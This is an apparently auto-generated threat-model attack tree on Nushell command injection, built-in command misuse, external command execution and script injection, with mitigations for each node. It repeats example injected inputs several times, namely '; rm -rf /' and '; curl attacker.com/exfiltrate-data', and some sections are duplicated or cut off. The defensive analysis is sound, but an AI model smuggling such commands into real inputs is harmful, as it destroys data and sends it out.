## Attack Tree Path: [1. Exploit Nushell Command Execution Vulnerabilities (High-Risk Path)](./attack_tree_paths/1__exploit_nushell_command_execution_vulnerabilities__high-risk_path_.md)

*   This path focuses on exploiting weaknesses in how the application handles and executes Nushell commands, particularly when user input or external data is involved.

    *   **1.1. Command Injection via Unsanitized Input (High-Risk Path)**
        *   This sub-path highlights the classic command injection vulnerability, made relevant in the context of Nushell.

        *   **1.1.1. Application directly executes Nushell commands with user-controlled input (Critical Node)**
            *   **Attack Vector:** If the application constructs Nushell commands by directly embedding user-provided input without proper sanitization, an attacker can inject malicious commands. For example, if the application uses Nushell to process filenames provided by the user and directly uses them in an `open` command, an attacker could inject commands like `; rm -rf /` or `; curl attacker.com/exfiltrate-data`.
            *   **Mitigation:**
                *   Input validation and sanitization: Thoroughly validate and sanitize all user inputs before using them in Nushell commands. Use allow-lists and escape special characters.
                *   Parameterized commands (if applicable in Nushell context): Aim to separate commands from data as much as possible. Use Nushell's data structures and pipelines to process data rather than directly embedding unsanitized strings into command strings.
                *   Avoid direct command execution: Minimize the need to dynamically construct and execute Nushell commands based on user input. Pre-define commands or use safer abstractions.

## Attack Tree Path: [1.1. Command Injection via Unsanitized Input (High-Risk Path)](./attack_tree_paths/1_1__command_injection_via_unsanitized_input__high-risk_path_.md)

*   This sub-path highlights the classic command injection vulnerability, made relevant in the context of Nushell.

        *   **1.1.1. Application directly executes Nushell commands with user-controlled input (Critical Node)**
            *   **Attack Vector:** If the application constructs Nushell commands by directly embedding user-provided input without proper sanitization, an attacker can inject malicious commands. For example, if the application uses Nushell to process filenames provided by the user and directly uses them in an `open` command, an attacker could inject commands like `; rm -rf /` or `; curl attacker.com/exfiltrate-data`.

                *   Avoid direct command execution: Minimize the need to dynamically construct and execute Nushell commands based on user input. Pre-define commands or use safer abstractions.

## Attack Tree Path: [1.1.1. Application directly executes Nushell commands with user-controlled input (Critical Node)](./attack_tree_paths/1_1_1__application_directly_executes_nushell_commands_with_user-controlled_input__critical_node_.md)

*   **Attack Vector:** If the application constructs Nushell commands by directly embedding user-provided input without proper sanitization, an attacker can inject malicious commands. For example, if the application uses Nushell to process filenames provided by the user and directly uses them in an `open` command, an attacker could inject commands like `; rm -rf /` or `; curl attacker.com/exfiltrate-data`.

## Attack Tree Path: [1.2. Exploiting Nushell Built-in Commands Vulnerabilities (High-Risk Path)](./attack_tree_paths/1_2__exploiting_nushell_built-in_commands_vulnerabilities__high-risk_path_.md)

*   This path focuses on the risks associated with the misuse or exploitation of Nushell's built-in commands, especially powerful ones.

        *   **1.2.2. Misuse of powerful Nushell commands for malicious purposes (Critical Node)**
            *   **Attack Vector:** Misuse of powerful Nushell commands like `open`, `save`, `http`, `rm`, `cp`, etc., can lead to security issues if not handled carefully within the application's Nushell scripts. For instance, if a script allows users to specify file paths for `save` without proper validation, an attacker could overwrite critical system files.
            *   **Mitigation:**
                *   Restrict Nushell command access: If possible, limit the set of Nushell commands available to the application's scripts. This might involve creating a custom Nushell environment or using process isolation.
                *   Least privilege: Run Nushell processes with the minimum necessary privileges.
                *   Security policies and audit logging: Implement security policies to govern Nushell usage and enable audit logging to track Nushell command execution for forensic analysis.

        *   **1.2.3. Exploiting Nushell's external command execution (Critical Node)**
            *   **Attack Vector:** Nushell allows executing external commands using the `^` prefix. If not controlled, this can be a significant attack vector. An attacker could use this to execute arbitrary system commands if the application's Nushell scripts allow or facilitate this in an uncontrolled manner.
            *   **Mitigation:**
                *   Disable external command execution (if unnecessary): If the application doesn't require executing external commands, consider disabling or restricting this feature to reduce the attack surface.
                *   Input validation for external commands: If external commands are necessary, carefully validate any input that influences the external commands being executed.
                *   Sandboxing: Run Nushell processes in a sandboxed environment to limit the impact of external command execution.

## Attack Tree Path: [1.2.2. Misuse of powerful Nushell commands for malicious purposes (Critical Node)](./attack_tree_paths/1_2_2__misuse_of_powerful_nushell_commands_for_malicious_purposes__critical_node_.md)

*   **Attack Vector:** Misuse of powerful Nushell commands like `open`, `save`, `http`, `rm`, `cp`, etc., can lead to security issues if not handled carefully within the application's Nushell scripts. For instance, if a script allows users to specify file paths for `save` without proper validation, an attacker could overwrite critical system files.

## Attack Tree Path: [1.2.3. Exploiting Nushell's external command execution (Critical Node)](./attack_tree_paths/1_2_3__exploiting_nushell's_external_command_execution__critical_node_.md)

*   **Attack Vector:** Nushell allows executing external commands using the `^` prefix. If not controlled, this can be a significant attack vector. An attacker could use this to execute arbitrary system commands if the application's Nushell scripts allow or facilitate this in an uncontrolled manner.
            *   **Mitigation:**

## Attack Tree Path: [2. Exploit Nushell Scripting Capabilities (High-Risk Path)](./attack_tree_paths/2__exploit_nushell_scripting_capabilities__high-risk_path_.md)

*   This path focuses on vulnerabilities arising from the application's use of Nushell scripting, particularly when scripts are influenced by external sources or user input.

    *   **2.1. Malicious Nushell Script Injection (High-Risk Path)**
        *   This sub-path highlights the risks of injecting and executing malicious Nushell scripts within the application's context.

        *   **2.1.1. Application executes user-provided Nushell scripts directly (Critical Node)**
            *   **Attack Vector:** If the application allows users to provide or influence Nushell scripts that are executed, attackers can inject malicious scripts to gain control, access data, or disrupt operations. This is akin to code injection at the Nushell script level. For example, if an application takes a Nushell script as input from a user to perform some data processing, a malicious user could provide a script designed to exfiltrate data or compromise the system.
            *   **Mitigation:**
                *   Avoid executing user-provided scripts: Ideally, avoid executing user-provided Nushell scripts directly. If absolutely necessary, implement extremely strict security measures.
                *   Strict sandboxing: If user-provided scripts must be executed, run them in a highly restrictive sandbox with minimal permissions and resource limits.
                *   Code review and static analysis: Thoroughly review and analyze any scripts, especially those derived from external sources, for potential vulnerabilities. Use static analysis tools to detect security flaws.
